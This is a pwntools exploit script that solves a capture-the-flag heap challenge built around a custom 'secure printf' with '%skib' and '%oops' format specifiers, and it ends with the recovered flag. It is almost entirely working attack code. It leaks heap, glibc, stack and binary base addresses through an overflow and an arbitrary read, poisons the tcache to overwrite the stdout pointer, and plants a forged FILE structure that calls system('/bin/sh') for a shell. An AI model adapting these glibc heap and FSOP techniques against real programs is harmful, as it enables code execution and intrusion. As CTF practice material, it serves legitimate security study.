from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    continue
''')

# p = remote('34.118.61.99', 10018)

# program allows 11 times of loop at most, each of which does following things:
# 1. request string size (0x5dc bytes at most) and string (size-1 bytes at most, by fgets)
# 2. request arguments number (3 at most) and arguments (8-byte long unsigned integer for each argument, by scanf)
# 3. call my_secure_printf function with string buffer, arguments number, and arguments
# all prompt messages are printed by calling my_secure_printf function to malloc and free a chunk of size 0x20
def secure_printf(strg_size, strg, args_num, args):
    p.sendlineafter(b"give format size\n", str(strg_size).encode())
    p.sendlineafter(b"give format\n", strg)
    p.sendlineafter(b"how many args?\n", str(args_num).encode())
    for arg in args:
        p.sendline(str(arg).encode())
# my_secure_printf function has following complexity:
# 1. malloc a chunk with size of string's length, which has to be in heap area or elf area, and fill it with string's length (0x10 if string's length is equal to 0x10) of zero bytes
# 2. traverse string byte by byte to set chunk data, which follows rules:
#    a. if pointer does not point to "%" or bytes left is less than 5, directly concatenate it with chunk data's string and increment pointer by 1 (only able to append non-zero bytes to null bytes region)
#    b. if pointer points to "%" and bytes left is greater than or equal to 5, except for lastly incrementing pointer by 5 and number of "%" byte by 1, and decrementing print out length by 5:
#       I. if current number of "%" byte is greater than or equal to given arguments number, call my_secure_printf function to malloc and free a chunk of size 0x40 to print error message "attempted to read more than args provided, skipping"
#       II. if current number of "%" byte is less than given arguments number:
#          i. if format specifier is "%skib", view current argument as a string of integer in decimal and concatenate it byte by byte with chunk data's string, and increment print out length by length of string of integer in decimal (16 at most) (only able to append non-zero bytes to null bytes region) (heap overflow possible)
#          ii. if format specifier is "%oops", view current argument as an address and copy 0xf bytes starting from it to concatenate with chunk data's string, and increment print out length by 0xf (able to copy null bytes to non-zero bytes region) (arbitrary read possible)
#          iii. if format specifier is not one of both, call my_secure_printf function to malloc and free a chunk of size 0x30 to print error message "unrecognized format specifier?!"
# 3. print out chunk data with maintained print out length (addresses leakage possible)
# 4. free chunk only if a global variable is set to 0
# key is to set global variable at offset 0x4128 to non-zero value, in which case malloced chunk will not be freed (tcache poisoning possible)

glibc_e = ELF('./libc.so.6')

# chunk of size 0x20 at heap_base_addr+0x2a0 is always malloced and freed to print out prompt messages

# Stage 1: heap feng shui to leak heap base address, glibc base address, stack argv address, and elf base address
# malloc and free chunk of size 0x50 at heap_base_addr+0x2c0, placing a right-shifted heap address at heap_base_addr+0x2c0
secure_printf(0x50, b'A'*0x3f, 0, [])
# malloc chunk of size 0x420 at heap_base_addr+0x310
# trigger both error messages to be printed, leading to chunk of size 0x30 at heap_base_addr+0x730 and chunk of size 0x40 at heap_base_addr+0x760 being malloced and freed
# free chunk of size 0x420 at heap_base_addr+0x310, placing a glibc address at heap_base_addr+0x310 and heap_base_addr+0x318
secure_printf(0x420, b'%fake%'.ljust(0x40e, b'A'), 1, [0])
# malloc chunk of size 0x20 at heap_base_addr+0x2a0
# trigger heap overflow from chunk of size 0x20 at heap_base_addr+0x2a0 to chunk of size 0x50 at heap_base_addr+0x2c0
# print out maintained 0x25 bytes of data, where last 5 bytes are right-shifted heap address at heap_base_addr+0x2c0
# free chunk of size 0x20 at heap_base_addr+0x2a0
secure_printf(0x20, b'%skib%skib'.ljust(0xf, b'A'), 2, [8888888888888888, 888888888888888])
heap_base_addr = u64(p.recv(0x25)[-5:].ljust(8, b'\x00'))<<12
log.info(f"heap base address: {hex(heap_base_addr)}")
# malloc chunk of size 0x30 at heap_base_addr+0x730
# trigger arbitrary read to copy 0xf bytes from heap_base_addr+0x310 to heap_base_addr+0x730
# trigger error message to be printed, leading to chunk of size 0x30 at heap_base_addr+0x310 being malloced and freed
# print out maintained 0x25 bytes of data, where first 6 bytes are glibc address at heap_base_addr+0x730 copied from heap_base_addr+0x310
# free chunk of size 0x30 at heap_base_addr+0x730
secure_printf(0x30, b'%oops%fake'.ljust(0x1f, b'A'), 2, [heap_base_addr+0x310, 0])
p.recvuntil(b"unrecognized format specifier?!\n")
glibc_base_addr = u64(p.recv(6).ljust(8, b'\x00'))-(glibc_e.symbols['main_arena']+96)
log.info(f"glibc base address: {hex(glibc_base_addr)}")
# now tcache bin of size 0x30 is heap_base_addr+0x730 -> heap_base_addr+0x310
# malloc chunk of size 0x40 at heap_base_addr+0x760
# trigger arbitrary read to copy 0xf bytes from glibc_base_addr+glibc_e.symbols['__libc_argv'] to heap_base_addr+0x760
# trigger error message to be printed, leading to chunk of size 0x40 at heap_base_addr+0x340 being malloced and freed
# print out maintained 0x35 bytes of data, where first 6 bytes are stack address at heap_base_addr+0x760 copied from glibc_base_addr+glibc_e.symbols['__libc_argv']
# free chunk of size 0x40 at heap_base_addr+0x760
secure_printf(0x40, b'%oops%'.ljust(0x2f, b'A'), 1, [glibc_base_addr+glibc_e.symbols['__libc_argv']])
p.recvuntil(b"attempted to read more than args provided, skipping\n")
stack_argv_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"stack argv address: {hex(stack_argv_addr)}")
# now tcache bin of size 0x40 is heap_base_addr+0x760 -> heap_base_addr+0x340
# malloc chunk of size 0x20 at heap_base_addr+0x2a0
# trigger arbitrary read to copy 0xf bytes from stack_argv_addr-0x48 to heap_base_addr+0x2a0
# print out maintained 0x10 bytes of data, where first 6 bytes are elf address at heap_base_addr+0x2a0 copied from stack_argv_addr-0x48
# free chunk of size 0x20 at heap_base_addr+0x2a0
secure_printf(0x20, b'%oops', 1, [stack_argv_addr-0x48])
elf_base_addr = ((u64(p.recv(6).ljust(8, b'\x00')))&~0xff)-0x1200
log.info(f"elf base address: {hex(elf_base_addr)}")

# Stage 2: heap feng shui to overwrite elf stdout pointer through tcache poisoning to trigger fsop
# malloc chunk of size 0x3b0 at heap_base_addr+0x380
# trigger heap overflow from chunk of size 0x3b0 at heap_base_addr+0x380 to chunk of size 0x30 at heap_base_addr+0x730
# trigger arbitrary read to copy 0xf bytes from stack_argv_addr-0x538+10+0x38c+4+1 to heap_base_addr+0x730
# free chunk of size 0x3b0 at heap_base_addr+0x380
# make tcache bin of size 0x30 poisoned to be heap_base_addr+0x730 -> elf_base_addr+0x4120 (poisoned tcache fd pointer copied from stack_argv_addr-0x538+10+0x38c+4+1)
secure_printf(0x3b0, b'%skib%skib'+b'B'*0x38c+b'%oops'+b'\x00'+p64((elf_base_addr+0x4120)^((heap_base_addr+0x730)>>12)), 3, [8888888888888888, 8888888888888888, stack_argv_addr-0x538+10+0x38c+4+1])
# malloc chunk of size 0x30 at heap_base_addr+0x730
# trigger heap overflow from chunk of size 0x30 at heap_base_addr+0x730 to chunk of size 0x40 at heap_base_addr+0x760
# trigger arbitrary read to copy 0xf bytes from stack_argv_addr-0x1b8+5-(0xf-6) to heap_base_addr+0x760-(0xf-6)
# trigger error message to be printed, leading to chunk of size 0x30 at elf_base_addr+0x4120 being malloced and not freed
# since now, global variable at offset 0x4128 is non-zero, all malloced chunks later will not be freed anymore
# make tcache bin of size 0x40 poisoned to be heap_base_addr+0x760 -> elf_base_addr+0x4000 (poisoned tcache fd pointer copied from stack_argv_addr-0x1b8+5-(0xf-6))
secure_printf(0x30, b'%skib'+p64((elf_base_addr+0x4000)^((heap_base_addr+0x760)>>12)).rstrip(b'\x00')+b'B'*0x11+b'%oops%fake'+b'\x00', 3, [8888888888888888, stack_argv_addr-0x1b8+5-(0xf-6), 0])
# malloc chunk of size 0x3b0 at heap_base_addr+0x380
# trigger error message to be printed, leading to chunk of size 0x40 at heap_base_addr+0x760 being malloced and not freed
secure_printf(0x3b0, b'%fake'.ljust(0x39e, b'A'), 0, [])
# fake file structure starting from stack_argv_addr-0x6c8+0x38 on stack
# execution flow of fake file structure is __isoc99_scanf->__vfscanf_internal->_IO_default_uflow->_IO_new_file_underflow->_IO_wfile_overflow->_IO_wdoallocbuf
'''
fp->flags has to meet following conditions:

1. _IO_file_underflow / _IO_new_file_underflow: must jump
0x779b10060b3c f6c480                <__GI__IO_file_underflow+0x5c>   test   ah, 0x80
0x779b10060b3f 0f85ab000000          <__GI__IO_file_underflow+0x5f>   jne    0x779b10060bf0 <_IO_new_file_underflow+0x110>

2. _IO_file_underflow / _IO_new_file_underflow: must jump
0x779b10060bf0 2588020000            <__GI__IO_file_underflow+0x110>   and    eax, 0x288                                   
0x779b10060bf5 3d80020000            <__GI__IO_file_underflow+0x115>   cmp    eax, 0x280                                   
0x779b10060bfa 0f8428010000          <__GI__IO_file_underflow+0x11a>   je     0x779b10060d28 <_IO_new_file_underflow+0x248>
'''
target_addr = stack_argv_addr-0x6c8+0x38
fake_file = FileStructure(0)
fake_file.flags = 0x8280
fake_file._IO_write_end = glibc_base_addr+0x1772ba # 0x00000000001772ba: call qword ptr [rax + 0x10]; 
fake_file._IO_buf_base = glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00'))
fake_file._IO_buf_end = glibc_base_addr+glibc_e.sym.system
fake_file._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake_file._codecvt = glibc_base_addr+0xab5f7 # 0x00000000000ab5f7: mov rdi, qword ptr [rax + 8]; call qword ptr [rax]; 
fake_file._wide_data = target_addr-0x10
fake_file.unknown2 = p64(0)*5+p64(target_addr+0x30)
fake_file.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']+0x18-0x18
# malloc chunk of size 0x40 at elf_base_addr+0x4000
# trigger arbitrary read to copy 0xf bytes from stack_argv_addr-0x6c8+0x30 to elf_base_addr+0x20, overwriting elf stdout pointer with fake file structure address stack_argv_addr-0x6c8+0x38
# junk operation to trigger error message to be printed, ensuring that malloced chunk is of size 0x40 at elf_base_addr+0x4000 and overwritten elf stdout pointer is not polluted
# fill stack with zero bytes as much as possible to avoid unexpected behavior when triggering FSOP
secure_printf(0x40+0x500, b'B'*0x20+b'%oops%fake'+b'\x00'*6+p64(target_addr)+bytes(fake_file)+b'\x00'*0x200, 2, [target_addr-8, 0])
# fsop triggered once scanf encountered

p.interactive()

# nullctf{uh_i_guess_mine_wasn't_very_secure_either...:(}